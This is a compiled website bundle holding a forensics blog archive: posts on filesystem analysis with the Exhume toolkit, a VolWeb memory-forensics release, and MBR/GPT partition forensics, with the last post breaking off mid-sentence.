"use strict";(self.webpackChunkexhume=self.webpackChunkexhume||[]).push([[8130],{7735:e=>{e.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"thanatology-4","metadata":{"permalink":"/blog/thanatology-4","source":"@site/blog/2025-12-25-thanatology-4/index.md","title":"\ud83e\udd89 Thanatology part 4: Filesystem Forensics with the Exhume ToolKit.","description":"This blog post is part of the Thanatology blog post series. If you haven\u2019t checked it out, I recommend reading the following first:","date":"2025-12-25T00:00:00.000Z","tags":[{"inline":true,"label":"Thanatology","permalink":"/blog/tags/thanatology"},{"inline":true,"label":"Exhume","permalink":"/blog/tags/exhume"},{"inline":true,"label":"Digital Forensics","permalink":"/blog/tags/digital-forensics"},{"inline":true,"label":"Filesystem","permalink":"/blog/tags/filesystem"}],"readingTime":14.41,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"thanatology-4","title":"\ud83e\udd89 Thanatology part 4: Filesystem Forensics with the Exhume ToolKit.","authors":["k1nd0ne"],"tags":["Thanatology","Exhume","Digital Forensics","Filesystem"],"draft":false},"unlisted":false,"nextItem":{"title":"\ud83d\udce6 VolWeb v3.15 July 2025 Release","permalink":"/blog/volweb-3-15"}},"content":"This blog post is part of the Thanatology blog post series. If you haven\u2019t checked it out, I recommend reading the following first:\\n-\\t[Thanatology part 1: Introduction to the Thanatology project](https://www.forensicxlab.com/blog/thanatology)\\n-\\t[Thanatology part 2: Multiple disk images formats handling using the Exhume ToolKit](https://www.forensicxlab.com/blog/thanatology-2)\\n- [Thanatology part 3: MBR and GPT forensics with the Exhume ToolKit.](https://www.forensicxlab.com/blog/thanatology-3)\\n\\nIn the previous part, we discovered how to perform partition discovery for the MBR and GPT layouts. The next step in our digital forensics examination process of a disk image is to identify the type of Filesystem present on a given partition and extract relevant data. In this blog post, we will first dive into the concept of file systems in general. Next, we will explore how the Exhume toolkit is designed to propose a way to understand multiple kinds of file systems and introduce an abstraction module. Finally, some updates on the Thanatology project will be proposed.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Filesystems\\n\\nAs humans, we began to keep everything recorded and organised in the physical world to track our actions over time. If you are looking for a payment you made three months ago to someone who is claiming you didn\'t, you will be able to prove that the accusation is wrong by looking inside the record containing all of your expenses in time. If you forgot one ingredient for how to cook your favourite recipe, you\'ll be happy to check the record containing the recipe. In the end, to record and keep things organised, you need a physical and trustworthy tool, such as a pen and paper or a book.\\n\\nWell, a book is fine for keeping your recipes, but the amount of information we have to keep track of is now enormous, and computers are addressing this need with success. Instead of having an enormous room with a lot of books, everything can now be shrunk and stored in digital long-term memory storage objects (Hard drives, SSDs, etc.).\\n\\n![alt text](../images/thanatology-4/1.svg \\"From Lib to Hardrive\\")\\n\\nNow, how would you keep your library organised? How would you sort, categorise, and access them? What would you do if you wanted to get rid of the content of a book? Would you burn it? Just remove what was written on each pages to be able to write in the same book again? \\n\\nThe fact is that now, as a user of an operating system, you don\'t really control the organisation of your \\"library\\" anymore; you are bound to ask to manipulate the data you want to interact with, with no say on how it is stored or organised. You could say: \\"*On my machine, I\'m managing my files and folders as you would in a library*\\". But it is you working with a layer of abstraction provided by the operating system to manipulate data. When you click on the \\"Delete\\" button to remove a file from your disk, you are not really in control of how the file will be deleted (how your book will be destroyed); you are just \\"asking\\" your **operating system** to do it for you. It\'s as if you are now interacting with a librarian. You ask for information from a book, and the librarian will take care of it for you. They know the organisation of the library and how to access the information you want, so you don\'t have to worry about it anymore. You are trusting this person to manage the library well.\\n\\nIn our digital world now, **a filesystem is an organisational methodology used to keep your files organised on a digital storage solution**. An like there are different ways to keep a library organised, there is different ways to manage files on a storage medium. Therefore, other kinds of file systems exist. The operating system\'s job is to understand how to work with the file system to provide data to the end user. In our case, the librarian is the operating system.\\n\\n![alt text](../images/thanatology-4/2.svg \\"The librarian\\")\\n\\n### File systems in digital forensics\\n\\nLet\'s say you are an investigator. A person is under arrest for a crime; the information that he is guilty is potentially stored in his personal library, managed by his librarian. However, you will not be able to ask the librarian anything, as you have frozen the place, and the librarian of the suspect cannot be approached. You now need to understand how the library is organised: how books are stored and accessed, and how they are shelved. If they are not well shredded, you can maybe retrieve some pages. \\n\\nIn the digital forensics world, the same principle applies; you cannot directly investigate using the suspect\'s operating system. Instead, you freeze the data to ensure integrity is preserved. \\n\\nI\'m using the word \\"freeze\\" , but in practice, in the digital forensics field, that means we perform analysis in a way that does not modify the evidence:\\n- We keep access read-only (write-blocking for physical drives, or read-only handling for images).\\n- We avoid using the suspect operating system to interpret the disk, and we avoid any operation that could modify metadata.\\n\\nThen, you need to understand what kind of file system is used and how it manages the records (files) and organises them. The better understanding you have of a filesystem, the better you\'ll be able to retrieve information. By design, some file systems do not completely delete records for performance reasons, for example. \\n\\nReturning to our library metaphor, if you had multiple library experts on your team who understand various library organisations, you could ask them to retrieve a specific record for you. In the digital forensics, that would be the toolsets of a digital forensics tools to understand multiple kinds of file systems.\\n\\n![alt text](../images/thanatology-4/3.svg \\"Versus\\")\\n\\n\\nThe first quick conclusion we can make is: **the better a digital forensics investigator understands how a filesystem works and its inner workings, the better they will be able to extract the data they need to build their case.**\\n\\n\\n## Kinds of Filesystems\\n\\nThere are many file system types, each providing ways to store data depending on the goals. Not all of the filesystems can be \\"understood\\" by a single operating systems. Operating systems are usually built to work with some specific file systems. For example, Microsoft Windows, by default, works with the New Technology File System (NTFS) but cannot work with the Extended Filesystem Version 4 (ext4) by default, whereas the Linux Operating system, for example, can work with ext4. As a digital forensics investigator, the better we understand a file system and how the operating system uses it to store information, the better we can build the dedicated tools to extract artefacts. There are many file system types, you can find an exhaustive list here: https://en.wikipedia.org/wiki/List_of_file_systems\\n\\n## The Exhume ToolKit - Filesystem investigation\\n\\nTo be able to interact with these types of filesystems from a digital forensics perspective, we have architected the exhume framework to provide the digital forensics experts and investigators with the following capabilities:\\n\\n- Dive into a file system type and extract information related to its specific characteristics.\\n- Propose API functions for each module to develop specific extraction modules that automate artefact collection.\\n- Provide a higher level of abstraction that normalises information across filesystem types.\\n\\n\\n### Exhume Filesystem modules\\n\\nThe principle is as follows: for each filesystem type, an exhume module is created, providing a Command Line Interface for some investigators and API functions for investigators with developing skills. This way, each exhume module can be customised to propose unique features related to this specific file system type. An expert in a particular kind of file system can contribute to developing specific functionalities that enhance its capabilities for a particular digital forensic task.\\n\\n\\n![alt text](../images/thanatology-4/4.svg \\"Exhume Modules\\")\\n\\nThe Exhume Toolkit currently propose three filesystem modules:\\n\\n- ExFAT (exhume_exfat)\\n- Extended Filesystem (exhume_extfs)\\n- New Technology Filesystem (exhume_ntfs)\\n\\nEach is capable of understanding the associated file systems and can extract specific data. They can be enhanced by the community at any point, making them very flexible.\\n\\n#### An Example\\n\\nLet\'s see an example. I have here a digital forensics disk image. I have discovered it is using a Linux Filesystem using the exhume_partitions module\'s CLI.\\n\\nUsing the following command: `exhume_partitions --body workshop-kali.E01`\\n\\n![alt text](../images/thanatology-4/5.png \\"Exhume Modules\\")\\n\\nIn this situation, the Linux Filesystem starts at the absolute address offset **0x100000** and has a size of **0x9c00000** sectors. Let\'s try to use the exhume_extfs module. First, we need to install it with the following command: \\n\\n`cargo install exhume_extfs`\\n\\nNext, we can get information about the cli using the following command:\\n\\n`exhume_extfs --help`\\n\\n```bash\\nExhume artefacts from an EXTFS partition.\\n\\nUsage: exhume_extfs [OPTIONS] --body <body> --offset <offset> --size <size>\\n\\nOptions:\\n  -b, --body <body>            The path to the body to exhume.\\n  -f, --format <format>        The format of the file, either \'raw\' or \'ewf\'.\\n  -o, --offset <offset>        The extfs partition starts at address (decimal or hex).\\n  -s, --size <size>            The size of the extfs partition in sectors (decimal or hex).\\n  -i, --inode <inode>          Display the metadata about a specific inode number (>=2).\\n  -d, --dir_entry              If --inode is specified, and it is a directory, list its directory entries.\\n      --dump                   If --inode is specified, dump its content to a file named \'inode_<N>.bin\'.\\n      --superblock             Display the superblock information.\\n      --journal                Display the journal block listing (jls).\\n  -j, --json                   Output specific structures (superblock, inode) in JSON format.\\n  -l, --log-level <log_level>  Set the log verbosity level [default: info] [possible values: error, warn, info, debug, trace]\\n      --recover                Scan all free inodes and carve deleted files\\n  -t, --timeline               Print a JSON timeline assembled from the ext4 journal\\n  -h, --help                   Print help\\n  -V, --version                Print version\\n```\\n\\nIn the Extended File System, the superblock holds important metadata about how this file system stores files. Let\'s try to print the superblock information using the following command:\\n\\n`exhume_extfs --body workshop-kali.E01 --offset 0x100000 --size 0x9c00000 --superblock`\\n\\n![alt text](../images/thanatology-4/6.png \\"Exhume Modules\\")\\n\\nTo fully understand the output, the digital forensics investigator must be educated on the internals of this specific file system. Therefore, the exhume module dedicated to this file system aims to provide everything the experts need to retrieve the information.\\n\\nIn the extended file system world, files and directories are all represented and identified as \\"inodes\\". The root directory has the inode number 2. We can display the Inode 2 directory entry members with the following command:\\n\\n`exhume_extfs --body workshop_kali.E01 --offset 0x100000 --size 0x9c00000 --inode 2 --dir_entry`\\n\\n![alt text](../images/thanatology-4/7.png \\"Exhume Modules\\")\\n\\nHere we are witnessing the list of inodes in the directory entry of the inode number 2. We can also, for example, retrieve the metadata about  inode two just with the following: \\n\\n`exhume_extfs --body workshop_kali.E01 --offset 0x100000 --size 0x9c00000 --inode 2`\\n\\n![alt text](../images/thanatology-4/8.png \\"Exhume Modules\\")\\n\\n\\nFinally, we can utilise the **--recover** unique flag of this module to attempt to recover files based on research conducted on this filesystem.\\n\\n\\n```bash\\n[2025-12-25T15:00:15Z INFO  exhume_body] Detected an EWF disk image.\\n[2025-12-25T15:00:15Z INFO  exhume_extfs::superblock] Extended FileSystem Journaling feature is on.\\n[2025-12-25T15:00:15Z INFO  exhume_extfs] Scanning filesystem for deleted files\u2026\\n[2025-12-25T15:09:54Z INFO  exhume_extfs] Recovered 5 deleted file(s)\\ninode 4458900  inode_4458900.bin               (131072\u202fbytes)\\ninode 4458901  inode_4458901.bin               (1892\u202fbytes)\\ninode 4458902  inode_4458902.bin               (1892\u202fbytes)\\ninode 4458907  inode_4458907.bin               (1892\u202fbytes)\\ninode 4458908  inode_4458908.bin               (1892\u202fbytes)\\n```\\n\\n\\n### Exhume Filesystem abstraction module\\n\\nThe filesystem-specific modules are functional for experts who have a deep understanding of their layout. However, digital investigators usually want to be able to quickly extract files to index them in a normalised way and get into details maybe later, depending on the context. \\n\\nFor this, I had to think of a top-level filesystem extraction module to automatically detect the filesystem and propose basic digital forensics features that can be achieved by combining the shared characteristics across filesystems. The following was identified: \\n\\n- Filesystem metadata extraction\\n- Filesystem enumeration\\n- File metadata extraction\\n- File content extraction\\n\\nWe have abstracted the concepts of a File and a DirectoryEntry using the power of Rust traits. Using this methodology, each filesystem type implemented in the future can also implement the Filesystem Trait of exhume_filesystem.\\n\\n![alt text](../images/thanatology-4/9.svg \\"Exhume Modules\\")\\n\\n:::info\\nexhume_filesystem provides a unified interface across multiple filesystems. However, a normalised model will always hide important filesystem-specific semantics. For example:\\n- Timestamps are not equivalent across file systems (and even within a single file system). \\"Deletion time\\" may not exist or may have different update rules.\\n- Identity differs: ext4 uses inodes, NTFS uses MFT record, and exFAT uses directory entry structures. We use the identification system of the filesystem itself when present and create our own when it is not present.\\n- Some features are filesystem-specific (e.g., NTFS Alternate Data Streams) and have no direct equivalent in other file systems.\\n\\nFor this reason, the abstraction layer focuses on everyday operations (enumeration, basic metadata, content extraction) while each filesystem module can expose extended/raw metadata for deeper analysis.\\n:::\\n\\n#### Example\\n\\nTo use exhume_filesystem, we can install it with the following command: \\n\\n`cargo install exhume_filesystem`\\n\\nSimilarly, we can execute this module on our disk image and enumerate all files using the `--enum` flag.\\n\\nUsing our previous disk image following command is used: `exhume_filesystem --body workshop-kali.E01 --offset 0x100000 --size 0x9c00000 --enum`\\n\\n![alt text](../images/thanatology-4/10.png \\"Exhume Modules\\")\\n\\nYou can see that exhume_filesystem detects the filesystem used and, if compatible, executes the filesystem enumeration function related to the extended filesystem in that case. The following output is the result ran on an NTFS file system. \\n\\n\\n![alt text](../images/thanatology-4/11.png \\"Exhume Modules\\")\\n\\n\\n\\n## Bridge to the Thanatology project\\n\\nAs mentioned in the first part of this series, one of my goals is to create a high-level Digital Forensics investigation tool for investigators, usable by people with different levels of expertise. The Exhume Toolkit API is used as the core engine for this project.\\n\\nThe decision was made to divide the investigation of the disk image into multiple stages, which I will describe below.\\n\\n### Step 1: Filesystem identification\\n\\nWhen choosing the partition to process by the Thanatology engine, the exhume_filesystem detection library is used to check if the targeted filesystem is supported. \\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-4/11.png\\" alt=\\"Partition discovery and selection in Thanatology\\" />\\n    <figcaption><i>Partition discovery and selection in Thanatology</i></figcaption>\\n</figure>\\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-4/12.png\\" alt=\\"Filesystem detection in Thanatology\\" />\\n    <figcaption><i>Filesystem detection in Thanatology</i></figcaption>\\n</figure>\\n\\n\\n### Step 2: Filesystem indexation\\n\\nUsing the exhume_filesystem API, we can enumerate every file and index them in a SQLite database to perform other actions on them later and display the extracted metadata to the user.\\n\\n\\nThanatology will first discover and index all the files in the SQLite database, then execute other analysis dedicated modules, such as file type identification, artefact extraction, and more, in due time.\\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-4/13.png\\" alt=\\"Filesystem detection in Thanatology\\" />\\n    <figcaption><i>Filesystem file discovery and indexation</i></figcaption>\\n</figure>\\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-4/14.png\\" alt=\\"Filesystem detection in Thanatology\\" />\\n    <figcaption><i>Filesystem detection in Thanatology</i></figcaption>\\n</figure>\\n\\n### Step 3: Visualisation\\n\\nNow that the files are indexed, we can provide the user with a visualisation interface. He will be able to interact with the file. If the investigator wants to fetch the content of a file, he will be able to do so. The exhume_filesystem API will be used behind the scenes to fetch the data.\\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-4/15.png\\" alt=\\"Filesystem data visualisation\\" />\\n    <figcaption><i>Filesystem metadata visualisation</i></figcaption>\\n</figure>\\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-4/16.png\\" alt=\\"Filesystem data visualisation\\" />\\n    <figcaption><i>Filesystem listing</i></figcaption>\\n</figure>\\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-4/17.png\\" alt=\\"Filesystem data visualisation\\" />\\n    <figcaption><i>File content investigation.</i></figcaption>\\n</figure>\\n\\n\\n## Conclusion\\n\\nIn this part, we moved from partition discovery to filesystem-level forensics:\\n- We introduced why investigators need to understand filesystem on-disk structures.\\n- We showed how Exhume\u2019s filesystem modules expose deep, filesystem-specific views and capabilities.\\n- We presented exhume_filesystem, a higher-level layer that can detect supported file systems and provide standard capabilities, such as enumeration, basic metadata extraction, and file content extraction.\\n\\nThe abstraction layer intentionally focuses on common denominators; some filesystem-specific semantics (multiple timestamp sources, NTFS ADS, special metadata) are best handled in the dedicated modules.\\n\\nIn the next part of the series, we will build on the indexed filesystem view to automate artefact extraction and analysis modules (file type identification, targeted parsers, and timeline-oriented workflows). We will link to Thanatology\u2019s database-backed approach.\\n\\nIf you want to get involved into this project, we have created a Discord Community Server that you can join using the following [link](https://discord.com/invite/AqkYgR5HEg)."},{"id":"volweb-3-15","metadata":{"permalink":"/blog/volweb-3-15","source":"@site/blog/2025-07-13-volweb-3-15/index.md","title":"\ud83d\udce6 VolWeb v3.15 July 2025 Release","description":"Following the parity release of the Volatility3 v2.26 framwework, we updated VolWeb to add the latest plugins, fix some issues and add some new features ! Learn more about the news in this blogpost.","date":"2025-07-13T00:00:00.000Z","tags":[{"inline":true,"label":"VolWeb","permalink":"/blog/tags/vol-web"},{"inline":true,"label":"Memory Forensics","permalink":"/blog/tags/memory-forensics"},{"inline":true,"label":"Digital Forensics","permalink":"/blog/tags/digital-forensics"}],"readingTime":2.88,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"volweb-3-15","title":"\ud83d\udce6 VolWeb v3.15 July 2025 Release","authors":["k1nd0ne"],"tags":["VolWeb","Memory Forensics","Digital Forensics"]},"unlisted":false,"prevItem":{"title":"\ud83e\udd89 Thanatology part 4: Filesystem Forensics with the Exhume ToolKit.","permalink":"/blog/thanatology-4"},"nextItem":{"title":"\ud83e\udd89 Thanatology part 3: MBR and GPT forensics with the Exhume ToolKit.","permalink":"/blog/thanatology-3"}},"content":"![](../images/volweb-3-15/releaseVolWeb.svg)\\n\\nFollowing the parity release of the Volatility3 v2.26 framwework, we updated VolWeb to add the latest plugins, fix some issues and add some new features ! Learn more about the news in this blogpost.\\n\\n\x3c!-- truncate --\x3e\\n\\n# Overview / Summary\\n\\nIn this new version of VolWeb, we added some of the plugins released in the [2.26 version of Volatility3](https://github.com/volatilityfoundation/volatility3/releases/tag/v2.26.0) to the VolWeb Engine for Windows and Linux memory forensics. We also added the Linux Explore feature, a Kubernetes manifest example and fixed some bugs.\\n\\n## \ud83d\udd2c New Features\\n\\n### \ud83d\udd0d Explore for Linux\\n\\nApart of the parity release plugins included from the volatility3 framwework, the goal of VolWeb is to provide a different way to **visualize** data. We included the \\"Explore\\" feature for the Linux Memory Forensics investigation.\\n\\nWhen clicking on the Explore tab, a graph is presented, listing the root processes nodes extracted from the Process Tree.\\n\\n![](../images/volweb-3-15/1.png)\\n\\n\\n#### Navigating the process tree\\n\\nIf a node is selected, the child process nodes will be displayed in order for the investigator to explore the graph.\\n\\n\\n![](../images/volweb-3-15/2.png)\\n\\n\\n#### Process detailled investigation\\n\\nThe process details window allows the investigator to view more artifacts about the selected process by clicking on the \\"view more\\" button.\\n\\n![](../images/volweb-3-15/3.png)\\n\\n### \ud83d\udd26 Filtering tables\\n\\nWe included the MUI Toolbar for each DataGrid, allowing you to filter, export the table, and column customization.\\n\\n![](../images/volweb-3-15/4.png)\\n\\n![](../images/volweb-3-15/5.png)\\n\\n\\n### Kubernetes Manifest\\n\\nAs requested from some members of the community, we have added a sample kubernetes manifest ready for production in order for system administrator to deploy volweb in 3 simple commands. You can learn more in the [Documentation](https://github.com/k1nd0ne/VolWeb/wiki/VolWeb-Documentation#-tutorial---deploying-volweb-with-kubernetes)\\n\\n## \ud83e\udea2 Bug fixes\\n\\nSeveral issues were addressed in this release\\n\\n- MFTScan deactivation: This plugin is extracting the activies about the Windows Master File Tables updates. However, it is generating a LOT of events and was slowing down the analysis process, making the storage of the resulting JSON object sometimes impossible on too large dataset and making the server crash when fetching the Timeliner from the front-end. This amount of data was unexcepted and was polluting the timeline graph making the visualization less sharp. We also need to implement server side processing in order to display all of the data in the DataGrid (MUI Tables). This will take some time but it will greatly increase the performance of the application in time. **Until this feature is available, we have disabled the MFTScan plugin and removed those artifacts from the Timeliner.**\\n\\n- Nginx frontend misconfiguration: A bug was identified in our nginx configuration resulting in 500 errors because of a internal rewrite redirecting to /dashboard/ instead of /.\\n\\n\\n## \ud83c\udfaf Future releases\\n\\nThis release include new functionalities but Volatility3 2.26 comes with new dumping features that we want to include into VolWeb and enhance the visualization of some artefacts like Malfind. We also want to include suspicious process recon like done in Windows but for Linux, and fix the \\"BigData\\" issue faced with some plugins with server-side processing. Note that this project is currently done on my free time like all of the projects on ForensicXlab, so this will depend highly on my motivation. That\'s why we need your contributions ! Don\'t forget that we have a Discord server if you would like to talk directly to the community."},{"id":"thanatology-3","metadata":{"permalink":"/blog/thanatology-3","source":"@site/blog/2025-07-07-thanatology-3/index.md","title":"\ud83e\udd89 Thanatology part 3: MBR and GPT forensics with the Exhume ToolKit.","description":"This blogpost is part of the Thanatology blogpost series. If you haven\u2019t check it out, I recommend reading the following first:","date":"2025-07-07T00:00:00.000Z","tags":[{"inline":true,"label":"Thanatology","permalink":"/blog/tags/thanatology"},{"inline":true,"label":"Exhume","permalink":"/blog/tags/exhume"},{"inline":true,"label":"Digital Forensics","permalink":"/blog/tags/digital-forensics"}],"readingTime":10.98,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"thanatology-3","title":"\ud83e\udd89 Thanatology part 3: MBR and GPT forensics with the Exhume ToolKit.","authors":["k1nd0ne"],"tags":["Thanatology","Exhume","Digital Forensics"]},"unlisted":false,"prevItem":{"title":"\ud83d\udce6 VolWeb v3.15 July 2025 Release","permalink":"/blog/volweb-3-15"},"nextItem":{"title":"\ud83e\udd89 Thanatology part 2: Multiple disk images formats handling using the Exhume ToolKit","permalink":"/blog/thanatology-2"}},"content":"This blogpost is part of the Thanatology blogpost series. If you haven\u2019t check it out, I recommend reading the following first:\\n-\\t[Thanatology part 1: Introduction to the Thanatology project](https://www.forensicxlab.com/blog/thanatology)\\n-\\t[Thanatology part 2: Multiple disk images formats handling using the Exhume ToolKit](https://www.forensicxlab.com/blog/thanatology-2)\\n\\n\\n In this blogpost, we will dive into the concepts of GPT and MBR partition schemes and explore them using [Exhume Partitions](https://www.forensicxlab.com/docs/category/-exhume---partitions).\\n\\n\x3c!-- truncate --\x3e\\n\\n## Discovering a Disk Image Layout\\n\\nIn the last blogpost we presented how [Exhume Body](https://www.forensicxlab.com/docs/category/-exhume---body) is providing us with an easy way of reading sectors on multiple disk image formats. Now that we have this module, the next step when performing the digital forensic analysis of a disk image is to discover its layout.\\n\\nIn order for any computer to load an operating system when powering it up, the processor must locate and execute bootstrapping code stored in a well-defined location on the disk. This code is typically found in the Master Boot Record (MBR) for legacy BIOS systems or the GUID Partition Table (GPT) for modern UEFI-based systems.\\n\\n![](../images/thanatology-3/1.svg)\\n\\nThese structures define how the disk is divided into partitions. Partitions are simply set of logical segments that can each contain a filesystem. Proper partition analysis helps forensic investigators understand how the disk was used, identify hidden or suspicious partitions, and extract meaningful artifacts. It also provides context, such as whether the disk uses a standard layout or one that suggests tampering or obfuscation.\\n\\nUnderstanding the partitioning scheme is critical as an investigator, as it determines how data structures are interpreted in subsequent analysis phases. Once the partition layout is identified, each partition can be parsed individually for deeper inspection of its filesystem contents. In the later blogposts of this series we will dive into a lot of filesystems like extfs, NTFS, exFAT, and more!\\n\\n### Metric used in this series\\n\\nA bit of vocabulary so we are on the same page. In this blogpost and all of the others of this series:\\n\\nA **sector** is the smallest addressable unit of data on a disk or other block storage device. Usually, a sector is **512 bytes in size**, though modern devices may use 4,096-byte (or 4K) sectors for improved efficiency. **Unless specified, we will always use a 512 bytes size when mentioning sector size**.\\n\\n## The Master Boot Record (MBR)\\n\\nThe Master Boot Record (MBR) is a special boot sector located at the very beginning of a storage device, typically the first 512 bytes (1 sector). It plays a crucial role in the booting process of legacy BIOS systems. The MBR consists of three main components: the bootloader code (usually the first 446 bytes), the partition table (the next 64 bytes), and a boot signature (the last 2 bytes, typically 0x55AA). The bootloader contains the machine code that initiates the process of loading the operating system. The partition table holds information about **up to four primary partitions**, including their type, starting sector, and size.\\n\\n\\n![](../images/thanatology-3/2.svg)\\n\\n\\n### Partition entries in MBR\\n\\nAs you can see, an MBR partition entry is 16 bytes long and describes one partition on the disk. The partition table in the MBR contains space for up to four partition entries, located between byte 446 and 509 of the 512-byte MBR sector. In MBR, a partition entry is composed of metadata providing the necessary metadata to the system in order to continue the booting process.\\n\\n![](../images/thanatology-3/3.svg)\\n\\n\\nThe boot indicator gives the information on whether the partition is bootable (active) with the value 0x80 or not bootable (inactive) with the value 0x00. Note that only one partition should be marked as active. Multiple active partitions should trigger your interest as a digital forensic investigator.\\nThe Starting and Ending [CHS]( https://en.wikipedia.org/wiki/Cylinder-head-sector) Addresses are legacy special addresses used to locate the partition starting point. CHS stands for Cylinder-Head-Sector and is a legacy value divided into 3 bytes indicating the 3D coordinates and was used back in time when all disks were just a pile of cylinders with a head to read the data. It is very interesting to learn about CHS just to understand where all of those terms we are using are coming from.\\n\\n\\nWell, CHS is deprecated now, and the values you might find nowadays can be false because it\u2019s deprecated. Instead, we know rely on the Logical Byte Addressing (LBA) metric. LBA is not a coordinate system but simply a linear numbering system to specify the location of (sectors) on a storage. In MBR the Start LBA is referring to the address of the beginning of the partition in sectors. A value of 0x800 means that the sector number 0x800  of the disk is the start of the partition. With this information we can compute the physical address in the entire disk in bytes as:\\n\\n\\n<p style={{ textAlign: \\"center\\" }}><i>Absolute Address = LBA x SizeOfOneSector</i></p>\\n\\n\\nIn our example, the absolute address of the beginning of our partition would be 0x800 * 0x200 = 0x100000.  But where does the partition ends? Well, instead of using the end CHS address that is deprecated, we use the sector count field which represent the number of sectors taken by the partition. We just have to multiply this value by the size of one sector, and we have the size in bytes of the partition.\\n\\n\\n<p style={{ textAlign: \\"center\\" }}><i>PartitionSize = SectorsCount * SizeOfOneSector</i></p>\\n\\n\\nAnother very important field is the **partition type** number. This number indicates the partition type or rather the \\"filesystem type\\". In MBR, each filesystem type is assigned to a unique value between (0x00 to 0xFF). Originally, in the 1980s and early 90s, the field had just a few defined values like 0x01 for FAT12, 0x04 for FAT16 As more operating systems and filesystems emerged (e.g., NTFS, Linux ext, swap, HPFS, etc.) new values were assigned which was still manageable. Eventually, third parties started overloading the values \u2014 meaning one type of code might refer to multiple possible formats. For example, the value 0x07 can be used for NTFS, HPFS, exFAT and QNX. Well this is a mess and in digital forensics we can use this field as an information but as this is not authoritative, we rely on partition identification validation using other methods that we will describe in the next blogpost of this series.\\n\\n\\nFinally, the MBR signature field. It occupies the last 2 bytes of the 512-byte MBR sector with the constant value of **0x55AA** (in hex) (or AA 55 as it appears in little-endian order in a hex editor). Just overwriting this field will lead to an unbootable system using a legacy BIOS. Malware authors can target the MBR when writing Wipers. Malware like  [Whispergate](https://www.recordedfuture.com/research/whispergate-malware-corrupts-computers-ukraine) is a real-world example that is overriding the MBR bootloader section with a custom code to display a ransom note and override the first 199 bytes of each partition entry found.\\n\\n\\n## EBR: The \u201cugly\u201d fix for the partition entries limitation\\n\\nIf you followed everything until now, well first: congrats and thank you. Secondly, you noticed that the MBR is limiting the number of partition entries to 4. That is not enought nowadays as modern systems are using way more partition entries like dualboot systems, servers with multiple partitions to separate system functions, and more.\\n\\nTo counteract this, IBM and Microsoft introduced the Extended Boot Record. EBR is a special partition table that is pointed by a standard MBR partition entry and is holding metadata for one logical partition at a time. It follows a scheme very similar to MBR (with the same signature) and holds only 2 partition entries:\\n-\\tThe first one is describing a logical partition\\n-\\tThe second one is describing the location of another EBR partition\\n\\n\\n![](../images/thanatology-3/4.svg)\\n\\n\\nWith this method you can chain as many partition as you wish and \u201cextend\u201d the number of partitions you can fit into MBR. But this comes at the price of complexity and unused fields like the bootloader section of each EBR records. I haven\u2019t been digging into research, but I guess letting these empty unused bootloader sections could be used by malware to hide malicious code in there. Might be worth investigating this possibility.\\n\\nThe MBR\u2019s simplicity makes it widely supported, but also susceptible to tampering and limited in scalability compared to newer schemes like **GPT**.\\n\\n\\n## GUID Partition Table (GPT): The modern layout\\n\\nThe GUID Partition Table (GPT) is the modern partitioning scheme that replaces MBR, offering greater flexibility, scalability, and reliability. It was introduced as part of the UEFI (Unified Extensible Firmware Interface) standard, GPT supports disks larger than 2 terabytes and allows for an almost unlimited number of partitions (up to 128 by default, compared to MBR\u2019s limit of 4 primary partitions). Unlike MBR, we will use the LBA metric to describe the structure. As a reminder, 1 LBA = 1 Sector = 512 (0x200) bytes in our blog post series context.\\n\\n![](../images/thanatology-3/5.svg)\\n\\n### Protective MBR\\n\\nThe Protective MBR (PMBR) is a compatibility trick used in the in GPT to protect GPT disks from being misinterpreted by older, MBR-only tools. That\u2019s why the GPT Header is located at LBA 1. The PMBR is non-bootable and has a partition type value of 0xEE with a start LBA address at 0x1 and a number of sectors equal to the entire disk (or 0xFFFFFFF if the disk is too large). Its whole purpose is to prevents MBR-only tools (like old versions of fdisk or BIOS utilities) from thinking the disk is unpartitioned and say \u201cThis is a GPT disk. Don\u2019t mess with it.\u201d It also gives us as a Digital Forensics Investigator the clue that we are dealing with GPT. We can also check the PMBR to see if it was corrupted or messed up with by a potential malware.\\n\\n### The GPT Header\\n\\nThe GPT Header is a 512-byte structure (typically) that sits at LBA 1 (right after the Protective MBR at LBA 0). It describes:\\n\\t\u2022\\tThe layout of the GPT partition table\\n\\t\u2022\\tWhere to find partition entries\\n\\t\u2022\\tHow many partition entries exist\\n\\t\u2022\\tRedundant (backup) GPT structures\\n\\n![](../images/thanatology-3/6.svg)\\n\\n\\nThe GPT Header is very helpful in order for the Investigator to identify the partitions but if it was tampered with or corrupted, we can still rely on the fact that the backup information are still present at the end of the volume. We will see how we can do that with Exhume in a later 